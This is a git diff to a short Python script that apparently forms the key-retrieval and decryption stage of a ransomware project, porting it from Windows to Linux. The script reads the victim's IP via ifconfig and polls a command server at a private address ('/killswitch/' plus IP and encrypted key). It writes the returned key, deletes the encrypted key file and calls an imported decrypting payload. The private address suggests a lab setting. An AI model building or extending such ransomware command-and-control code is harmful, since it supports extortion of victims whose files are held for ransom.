@@ -1,13 +1,15 @@
 import requests,time
-import os,subprocess,re
-import decryption_payload_win as windows
+import os,platform,subprocess,re
+import linux_decrypting_payload as linux
 cipher_text = open('res/key.txt.y4h','rb').read()
 cipher = cipher_text.decode()
 del cipher_text
-cmd = "ipconfig"
+cmd = 'ifconfig'
 cmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-temp = re.findall('IPv4 Address.+: (.+)',cmd.stdout.read().decode())
-ip = temp[len(temp)-1].rstrip()
+temp =  re.findall('inet \d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}',cmd.stdout.read().decode())
+temp = temp[0].split(" ")
+temp = temp[1].rstrip()
+ip = temp
 while(True):
     try:
         res = requests.get('http://172.16.0.6:5000/killswitch/'+ip+'/'+cipher)
@@ -21,5 +23,5 @@ while(True):
     else:
         open('res/key.txt','w').write(res['keys'])
         os.remove('res/key.txt.y4h')
-	windows.decrypt_win()
+        linux.decrypt_lin()
         break
